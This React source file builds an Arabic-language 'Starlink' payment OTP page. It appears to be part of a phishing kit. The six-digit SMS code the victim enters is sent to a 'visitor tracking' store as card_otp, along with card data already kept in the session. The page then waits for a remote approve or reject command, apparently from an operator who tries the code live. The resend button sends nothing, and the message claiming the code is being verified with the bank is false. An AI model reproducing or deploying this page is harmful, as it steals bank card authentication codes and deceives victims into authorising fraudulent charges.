import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ShieldCheck, Loader2 } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

const OTP_LENGTH = 6;

const PaymentOtp = () => {
  const navigate = useNavigate();
  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [seconds, setSeconds] = useState(60);
  const [card, setCard] = useState<SavedCardMeta | null>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const stored = sessionStorage.getItem("starlink_card");
    if (!stored) navigate("/payment", { replace: true });
    setCard(readCardMeta());
  }, [navigate]);

  useEffect(() => {
    if (seconds <= 0) return;
    const id = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(id);
  }, [seconds]);

  useEffect(() => {
    const onApproval = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_otp") {
        setWaiting(false);
        navigate("/payment/success");
      } else if (detail.command === "reject_otp") {
        setWaiting(false);
        setDigits(Array(OTP_LENGTH).fill(""));
        toast({
          title: "\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642 \u062e\u0627\u0637\u0626",
          description: "\u0623\u0639\u062f \u0625\u062f\u062e\u0627\u0644 \u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0645\u0631\u0633\u0644 \u0639\u0628\u0631 SMS.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [navigate]);

  const handleDigitChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newDigits = [...digits];
    newDigits[index] = digit;
    setDigits(newDigits);
    if (digit && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
    const newDigits = Array(OTP_LENGTH).fill("");
    pasted.split("").forEach((ch, i) => { newDigits[i] = ch; });
    setDigits(newDigits);
    const nextEmpty = pasted.length < OTP_LENGTH ? pasted.length : OTP_LENGTH - 1;
    inputRefs.current[nextEmpty]?.focus();
  };

  const otp = digits.join("");

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < OTP_LENGTH) {
      toast({
        title: "\u0631\u0645\u0632 OTP \u063a\u064a\u0631 \u0645\u0643\u062a\u0645\u0644",
        description: "\u0623\u062f\u062e\u0644 \u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0645\u0631\u0633\u0644 \u0639\u0628\u0631 SMS.",
        variant: "destructive",
      });
      return;
    }
    setLoading(true);
    await updateVisitorData({ card_otp: otp });
    setLoading(false);
    setWaiting(true);
  };

  return (
    <>
      <SEO
        title={seoData.paymentOtp.title}
        description={seoData.paymentOtp.description}
        path="/payment/otp"
        noIndex
      />
      <div className="min-h-screen bg-background flex items-center justify-center px-4">
        <div className="w-full max-w-sm">

          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mb-3">
              <ShieldCheck className="w-4 h-4" />
              <span>\u062a\u062d\u0642\u0642 \u0622\u0645\u0646 \u2014 \u062e\u0637\u0648\u0629 \u0644\u0645\u062f\u0629 \u062f\u0642\u064a\u0642\u0629 \u0648\u0627\u062d\u062f\u0629</span>
            </div>
            <h1 className="text-2xl font-light tracking-wide mb-1">\u0631\u0645\u0632 OTP</h1>
            <p className="text-sm text-muted-foreground">
              \u0623\u0631\u0633\u0644\u0646\u0627 \u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642 \u0625\u0644\u0649 \u0647\u0627\u062a\u0641\u0643 \u0627\u0644\u0645\u0631\u062a\u0628\u0637 \u0628\u0627\u0644\u0628\u0637\u0627\u0642\u0629
            </p>
            {card && (
              <div className="mt-3 flex justify-center">
                <SavedCardBadge brand={card.brand} last4={card.last4} />
              </div>
            )}
          </div>

          <div className="border border-foreground/10 p-8 space-y-6">
            <form onSubmit={submit} className="space-y-5">
              <div>
                <label className="text-sm text-muted-foreground mb-3 block text-center">
                  \u0631\u0645\u0632 OTP \u2014 \u0645\u0643\u0648\u0651\u0646 \u0645\u0646 {OTP_LENGTH} \u062e\u0627\u0646\u0627\u062a
                </label>
                <p className="text-xs text-muted-foreground text-center mb-4">
                  \u0631\u0645\u0632 OTP \u0645\u0643\u0648\u0651\u0646 \u0645\u0646 {OTP_LENGTH} \u062e\u0627\u0646\u0627\u062a \u0641\u0642\u0637 \u2014 \u0623\u062f\u062e\u0644 \u0643\u0644 \u0631\u0642\u0645 \u0641\u064a \u062e\u0627\u0646\u062a\u0647 \u0627\u0644\u0645\u062e\u0635\u0635\u0629
                </p>

                <div className="flex gap-2 justify-center" dir="ltr" onPaste={handlePaste}>
                  {digits.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => { inputRefs.current[index] = el; }}
                      type="password"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleDigitChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      disabled={waiting}
                      autoFocus={index === 0}
                      className="w-11 h-14 bg-transparent border border-foreground/20 focus:border-foreground outline-none transition-colors text-center text-xl disabled:opacity-60"
                      required
                    />
                  ))}
                </div>

                <div className="flex justify-between items-center mt-3 text-xs text-muted-foreground">
                  <span>{seconds > 0 ? `\u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u062e\u0644\u0627\u0644 ${seconds}\u062b` : "\u064a\u0645\u0643\u0646\u0643 \u0625\u0639\u0627\u062f\u0629 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0645\u0632"}</span>
                  <button
                    type="button"
                    disabled={seconds > 0 || waiting}
                    onClick={() => setSeconds(60)}
                    className="underline disabled:opacity-40 disabled:no-underline"
                  >
                    \u0625\u0639\u0627\u062f\u0629 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0645\u0632
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading || waiting}
                className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
              >
                {waiting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    \u062c\u0627\u0631\u064d \u0627\u0644\u062a\u0623\u0643\u064a\u062f...
                  </>
                ) : loading ? (
                  "\u062c\u0627\u0631\u064d \u0627\u0644\u0625\u0631\u0633\u0627\u0644..."
                ) : (
                  "\u062a\u0623\u0643\u064a\u062f \u0627\u0644\u062f\u0641\u0639"
                )}
              </button>

              {waiting && (
                <p className="text-xs text-muted-foreground text-center">
                  \u0646\u062a\u062d\u0642\u0642 \u0645\u0646 \u0631\u0645\u0632 OTP \u0645\u0639 \u0627\u0644\u0628\u0646\u0643. \u0642\u062f \u064a\u0633\u062a\u063a\u0631\u0642 \u0630\u0644\u0643 \u0644\u062d\u0638\u0627\u062a.
                </p>
              )}
            </form>
          </div>

        </div>
      </div>
    </>
  );
};

export default PaymentOtp;
